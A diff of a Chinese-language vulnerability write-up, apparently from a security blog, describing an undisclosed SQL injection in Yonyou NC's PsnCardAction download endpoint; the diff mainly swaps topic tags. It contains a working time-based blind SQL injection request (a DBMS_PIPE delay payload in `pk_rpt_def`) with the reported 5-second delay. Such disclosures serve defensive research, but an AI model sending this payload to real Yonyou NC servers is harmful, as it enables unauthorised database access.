@@ -22,6 +22,8 @@ NC65
 
 nc/bs/hrss/pub/action/PsnCardAction.class
 
+计算机服务器
+
 ```
 package nc.bs.hrss.pub.action;
 
@@ -65,11 +67,11 @@ public class PsnCardAction extends BaseAction {
 
 深入探索
 
-客户关系管理
+搜索引擎
 
-网络设备
+网络
 
-软件
+计算机科学
 
 `pk_rpt_def` 带入 queryByPk 函数
 
@@ -109,6 +111,8 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 
 漏洞利用示例
 
+编程
+
 ```
 GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&pk_psnjob=1 HTTP/1.1
 HTTP/1.1
@@ -120,3 +124,5 @@ Host: nc.mrxn.net
 成功延时 5 秒
 
 这个洞和前面 [用友NC rmwebImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html) 和 [用友NC rmImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-rmImage-download-pk_psndoc-sqli.html) 两个洞差不多，只不过这个也是未公开的漏洞。
+
+黑客与破解
